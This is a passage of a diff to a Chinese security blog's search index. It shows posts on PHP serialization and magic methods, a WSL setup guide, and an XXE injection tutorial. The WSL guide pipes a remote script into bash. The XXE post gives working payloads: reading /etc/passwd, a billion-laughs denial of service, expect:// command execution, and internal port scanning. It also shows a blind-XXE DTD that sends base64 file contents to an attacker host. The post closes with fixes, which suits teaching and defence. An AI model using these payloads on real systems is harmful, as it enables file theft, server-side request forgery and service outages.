-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$publicVar</span> = <span class="string">&#x27;public&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">publicMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Public Method&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;publicVar; <span class="comment">// Output: public</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">publicMethod</span>(); <span class="comment">// Output: Public Method</span></span><br></pre></td></tr></table></figure>
-<ol start="2">
-<li><strong>protected（受保护的）</strong>：受保护的成员只能在其定义的类和其子类中访问。外部类无法直接访问受保护的成员。</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$protectedVar</span> = <span class="string">&#x27;protected&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">protectedMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Protected Method&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">accessProtected</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;protectedVar; <span class="comment">// 这里可以访问父类的受保护属性</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">SubClass</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">accessProtected</span>(); <span class="comment">// Output: protected</span></span><br></pre></td></tr></table></figure>
-<ol start="3">
-<li><strong>private（私有的）</strong>：私有成员只能在其定义的类内部访问，外部类和子类都无法直接访问私有成员。</li>
-</ol>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$privateVar</span> = <span class="string">&#x27;private&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">privateMethod</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Private Method&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="comment">// echo $obj-&gt;privateVar; // 无法直接访问私有属性，会导致错误</span></span><br><span class="line"><span class="comment">// echo $obj-&gt;privateMethod(); // 无法直接访问私有方法，会导致错误</span></span><br></pre></td></tr></table></figure>
-<p>这些访问修饰符允许类作者控制类成员的可见性和访问权限，从而提高代码的安全性和封装性。</p>
-<p>注：</p>
-<p>public：属性被序列化的时候属性值会变成<code>属性名</code></p>
-<p>protected：属性被序列化的时候属性值会变成 <code>\x00*\x00属性名</code></p>
-<p>private：属性被序列化的时候属性值会变成<code>\x00类名\x00属性名</code></p>
-<p>其中：<code>\x00</code>表示<strong>空字符</strong>，但是还是占用一个字符位置（空格）</p>
-<h3 id="PHP魔术方法">PHP魔术方法</h3>
-<ol>
-<li><code>__construct()</code>：类的构造函数，在创建对象时触发。用于初始化对象的状态。</li>
-<li><code>__destruct()</code>：类的析构函数，在对象被销毁时触发。用于执行清理操作。</li>
-<li><code>__call($name, $arguments)</code>：在对象上下文中调用不可访问的方法时触发。</li>
-<li><code>__callStatic($name, $arguments)</code>：在静态上下文中调用不可访问的方法时触发。</li>
-<li><code>__get($name)</code>：读取不可访问属性的值时触发。这里的不可访问包括私有属性或未定义属性。</li>
-<li><code>__set($name, $value)</code>：在给不可访问属性赋值时触发。</li>
-<li><code>__isset($name)</code>：当对不可访问属性调用 isset() 或 empty() 时触发。</li>
-<li><code>__unset($name)</code>：在不可访问的属性上使用unset()时触发。</li>
-<li><code>__invoke()</code>：当尝试以调用函数的方式调用一个对象时触发。即使对象不是一个函数。</li>
-<li><code>__sleep()</code>：执行serialize()时，先会调用这个方法。通常用于执行对象序列化之前的准备工作。</li>
-<li><code>__wakeup()</code>：执行unserialize()时，先会调用这个方法。通常用于执行对象反序列化之后的处理。</li>
-<li><code>__toString()</code>：当反序列化后的对象被输出在模板中时（转换成字符串时）自动调用。通常用于自定义对象的字符串表示形式。</li>
-</ol>
-<h4 id="魔术方法的执行过程">魔术方法的执行过程</h4>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;hi&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;no&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&quot;hiiiii!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is wakeup\n&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//反序列化之前</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is destruct\n&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//反序列化时会最后才触发</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is tostring\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is call\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is get\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;this is invoke\n&quot;</span>;</span><br><span class="line">    &#125;<span class="comment">//尝试当作函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say_hi</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hiuhiu\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();<span class="comment">// 所有最后都还要析构一次，对象的消失</span></span><br><span class="line"><span class="variable">$aa</span>-&gt;<span class="title function_ invoke__">say_hi</span>();</span><br><span class="line"><span class="variable">$bb</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);</span><br><span class="line"><span class="variable">$cc</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$bb</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aa</span>;<span class="comment">// 作为字符串用时触发 tostring</span></span><br><span class="line"><span class="variable">$aa</span>-&gt;<span class="title function_ invoke__">say_no</span>(); <span class="comment">//call</span></span><br><span class="line"><span class="variable">$aa</span>-&gt;c; <span class="comment">//get</span></span><br><span class="line"><span class="variable">$aa</span>(); <span class="comment">//invoke</span></span><br></pre></td></tr></table></figure>
-<p>执行结果：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">hiiiii!</span><br><span class="line">this is construct  //$aa=new A();</span><br><span class="line">hiuhiu  //$aa-&gt;say_hi();</span><br><span class="line">this is wakeup  //$bb=serialize($aa);</span><br><span class="line">this is tostring  //echo $aa;</span><br><span class="line">this is call  //$aa-&gt;say_no();</span><br><span class="line">this is get//$aa-&gt;c</span><br><span class="line">this is invoke  //$aa();</span><br><span class="line">this is destruct  //$cc=unserialize($bb);</span><br><span class="line">this is destruct</span><br></pre></td></tr></table></figure>
-<p>从序列化到反序列化这几个函数的执行过程是：<br>
-<code>__construct()</code> -&gt;<code>__sleep</code> -&gt; <code>__wakeup()</code> -&gt; <code>__toString()</code> -&gt; <code>__destruct()</code></p>
-<h3 id="PHP序列化的格式">PHP序列化的格式</h3>
-<p><code>O:&lt;length&gt;:&quot;&lt;class name&gt;&quot;:&lt;n&gt;:&#123;&lt;field name 1&gt;&lt;field value 1&gt;...&lt;field name n&gt;&lt;field value n&gt;&#125; </code></p>
-<p><code>O</code>:表示序列化的是对象<br>
-<code>&lt;length&gt;</code>:表示序列化的类名称长度<br>
-<code>&lt;class name&gt;</code>：表示序列化的类的名称<br>
-<code>&lt;n&gt;</code>:表示被序列化的对象的属性个数<br>
-<code>&lt;field name 1&gt;</code>：属性名<br>
-<code>&lt;field value 1&gt;</code>：属性值</p>
-<h3 id="POP链构造">POP链构造</h3>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -3662,59 +3662,101 @@ n = p * q = 61 * 53 = 3233<br>
       </tags>
   </entry>
   <entry>
-    <title>WSL配置</title>
-    <url>//post/WSL/</url>
-    <content><![CDATA[<h3 id="启用Windows功能">启用Windows功能</h3>
-<p>按Windows键全局搜索“启用或关闭Windows功能”</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016221806427.png"
-                        alt="image-20241016221806427"
-                 ></p>
-<p>打开后开启图中的四个选项，有些系统可能会没有翻译成中文，记得仔细对照<img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016222114609.png"
-                        alt="image-20241016222114609"
-                 ></p>
-<p>然后根据要求重新启动Windows系统</p>
-<h3 id="安装WSL">安装WSL</h3>
-<p>在Windows下按 Win 键，点击Windows PowerShell（管理员），在终端输入：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span> <span class="literal">--no-distribution</span></span><br></pre></td></tr></table></figure>
-<p>完成上述命令后，系统会自动安装不带任何发行版的Linux虚拟机</p>
-<p>如果想查看已安装的发行版以及相应的WSL版本，可以输入：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--list</span> <span class="literal">--verbose</span></span><br></pre></td></tr></table></figure>
-<p>安装Ubuntu</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--install</span> Ubuntu<span class="literal">-22</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure>
-<h4 id="也可以选择微软商店安装">也可以选择微软商店安装</h4>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20241016222658902.png"
-                        alt="image-20241016222658902"
-                 ></p>
-<p>然后就可以快乐的输入用户名和密码使用WSL了，<strong>注意用户名不可以有大写字母</strong></p>
-<h3 id="换源">换源</h3>
-<p>切换到root用户 <strong>(必须)</strong> ，用以下脚本一把梭</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> su</span><br><span class="line">bash &lt;(curl -sSL https://linuxmirrors.cn/main.sh)</span><br></pre></td></tr></table></figure>
-<h3 id="报错解决">报错解决</h3>
-<h4 id="一、内核更新">一、内核更新</h4>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">WslRegisterDistribution failed with error: 0x800701bc</span><br></pre></td></tr></table></figure>
-<p>以上报错需要下载安装适用于 x64 计算机的最新 WSL2 Linux 内核更新包</p>
-<p>安装链接：<a class="link"   href="https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi" >https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi<i class="fas fa-external-link-alt"></i></a></p>
-<h4 id="二、回退到无网络">二、回退到无网络</h4>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">C:\Users\67300\.wslconfig</span><br><span class="line">Error code: Wsl/Service/CreateInstance/CreateVm/ConfigureNetworking/HNS/E_ACCESSDENIED</span><br><span class="line"></span><br><span class="line">Error message is in norwegian but transelate to &quot;can not configure network (networkingMode Nat) you can disable networking in .wslconfig&quot;</span><br></pre></td></tr></table></figure>
-<p>在C盘用户目录下创建一个<code>.wslconfig</code>文件，输入以下内容</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">networkingMode=mirrored</span><br></pre></td></tr></table></figure>
-<p>然后Powershell输入即可</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wsl <span class="literal">--shutdown</span></span><br></pre></td></tr></table></figure>
+    <title>XXE漏洞</title>
+    <url>//post/XXEInjection/</url>
+    <content><![CDATA[<h2 id="XXE漏洞：XML外部实体注入漏洞">XXE漏洞：XML外部实体注入漏洞</h2>
+<h3 id="XXE漏洞的定义">XXE漏洞的定义</h3>
+<p>​	XXE漏洞（XML External Entity）是一种安全漏洞，它存在于应用程序对XML输入处理不当的情况下。XML外部实体（External Entity）允许在XML文档中引用外部资源，如文件系统、URL等。当应用程序未正确验证或过滤用户提供的XML输入时，攻击者可以通过构造恶意的XML文件，利用外部实体引用敏感文件、执行远程请求等操作，从而导致信息泄露、服务器端请求伪造（SSRF）、拒绝服务（DoS）等安全问题。</p>
+<h3 id="XXE漏洞的危害">XXE漏洞的危害</h3>
+<ol>
+<li>
+<p><strong>信息泄露：</strong> 攻击者可以利用XXE漏洞访问服务器上的敏感文件，如配置文件、数据库凭据等，从而获取敏感信息。</p>
+</li>
+<li>
+<p><strong>服务器端请求伪造（SSRF）：</strong> 攻击者可以利用XXE漏洞发起对内部网络的请求，可能导致服务器端请求伪造漏洞，从而进一步探测或攻击内部系统。</p>
+</li>
+<li>
+<p><strong>拒绝服务（DoS）：</strong> 攻击者可以通过恶意构造的XML文件引发大量资源消耗，导致服务器性能下降或完全不可用，造成拒绝服务。</p>
+</li>
+<li>
+<p><strong>远程代码执行（RCE）：</strong> 在某些情况下，XXE漏洞可能被利用以执行远程代码，导致服务器受到攻击者控制。</p>
+</li>
+<li>
+<p><strong>横向移动：</strong> 通过利用XXE漏洞，攻击者可能获取对服务器上其他应用程序或系统的访问权限，从而实现横向移动并扩大攻击范围。</p>
+</li>
+</ol>
+<h3 id="XML的定义">XML的定义</h3>
+<p>​	<strong>可扩展标记语言</strong>（E<strong>x</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage，简称：XML）是一种用于标记电子文件结构和数据的语言。它是一种通用的标记语言，旨在传输和存储数据，尤其适用于Internet环境。XML的设计目标是使数据具有自描述性和可扩展性。</p>
+<p>​	XML由一系列标签组成，每个标签用于标识数据的不同部分或属性。这些标签可以按照层次结构进行嵌套，从而创建复杂的数据结构。与HTML不同，XML没有预定义的标签集合，因此用户可以根据需要定义自己的标签。XML还允许用户定义数据类型、实体和命名空间，以增强数据的表现力和灵活性。</p>
+<p>​	XML的主要应用包括数据交换、配置文件、Web服务通信、数据存储等领域。它被广泛用于各种场景中，如Web开发、企业应用集成、文档标记等。 XML的易读性和灵活性使其成为一种流行的数据格式，受到广泛应用和支持。</p>
+<h3 id="XML的特点">XML的特点</h3>
+<ul>
+<li>XML 是一种很像 HTML 的标记语言，其设计宗旨是传输数据，而不是显示数据。</li>
+<li>XML 标签没有被预定义，需要自行定义标签。</li>
+<li>XML 被设计为具有自我描述性。</li>
+<li>XML 是 W3C 的推荐标准。</li>
+</ul>
+<h3 id="判断是否存在XXE漏洞">判断是否存在XXE漏洞</h3>
+<ol>
+<li>
+<p>检测XML是否会被解析</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#测试1</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [<span class="meta">&lt;!ENTITY <span class="keyword">shit</span> <span class="string">&quot;this is shit&quot;</span>&gt;</span>]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;shit;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">#测试2</span><br><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">hacker</span> <span class="string">&quot;ESHLkangi&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Dnslog方法-检测服务器是否支持外部实体（高匿）</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">shit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://8108b8fa5c.ipv6.1433.eu.org.&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%shit; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>如果上面两步都支持，那么就看能否回显。如果能回显，就可以直接使用外部实体的方式进行攻击。当然有时候服务器会不支持一般实体的引用。这样的话，只能使用Blind XXE（DNSlog）攻击。</p>
+</li>
+</ol>
+<h3 id="XXE的Payload">XXE的Payload</h3>
+<ol>
+<li>
+<p>文件包含</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>XXE炸弹：DOS攻击</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">lolz</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol</span> <span class="string">&quot;lol&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol2</span> <span class="string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol3</span> <span class="string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol4</span> <span class="string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol5</span> <span class="string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol6</span> <span class="string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol7</span> <span class="string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol8</span> <span class="string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">lol9</span> <span class="string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>XXE-命令执行（需要一些配置开启才能执行，很小概率能用）</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">		<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;expect://id&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>端口扫描</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8080“&gt;]&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;root&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;/root&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>通过DTO读取文件（Blind XXE）</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">name</span> <span class="keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://attack.com/1.dto“&gt;]&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;root&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">&lt;/root&gt;</span></span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>DTO的内容</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY xxe SYSTEM &#x27;http://ATTACKESERVER.com/?%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+<p>在attack的服务器WEB日志当中可以查看内容</p>
+</li>
+</ol>
+<h3 id="XML漏洞修复方法">XML漏洞修复方法</h3>
+<ol>
+<li>使用开发语言提供的禁用外部实体的方法</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newlnstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData=etree.parse(xmlSource,etree.XMLParser(resolve_entities=false))</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>
+<p>过滤用户提交的XML数据。过滤关键字：&lt;!DOCTYPE和&lt;/!ENTITY,或者SYSTEM和PUBLIC</p>
+</li>
+<li>
+<p>不允许XML中含有自己定义的DTD。</p>
+</li>
+</ol>
 ]]></content>
       <categories>
-        <category>开发</category>
+        <category>CTF</category>
       </categories>
       <tags>
-        <tag>环境配置</tag>
+        <tag>Web</tag>
       </tags>
   </entry>
   <entry>
@@ -4151,101 +4193,59 @@ XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用�
       </tags>
   </entry>
   <entry>
-    <title>XXE漏洞</title>
-    <url>//post/XXEInjection/</url>
-    <content><![CDATA[<h2 id="XXE漏洞：XML外部实体注入漏洞">XXE漏洞：XML外部实体注入漏洞</h2>
-<h3 id="XXE漏洞的定义">XXE漏洞的定义</h3>
-<p>​	XXE漏洞（XML External Entity）是一种安全漏洞，它存在于应用程序对XML输入处理不当的情况下。XML外部实体（External Entity）允许在XML文档中引用外部资源，如文件系统、URL等。当应用程序未正确验证或过滤用户提供的XML输入时，攻击者可以通过构造恶意的XML文件，利用外部实体引用敏感文件、执行远程请求等操作，从而导致信息泄露、服务器端请求伪造（SSRF）、拒绝服务（DoS）等安全问题。</p>
-<h3 id="XXE漏洞的危害">XXE漏洞的危害</h3>
-<ol>
-<li>
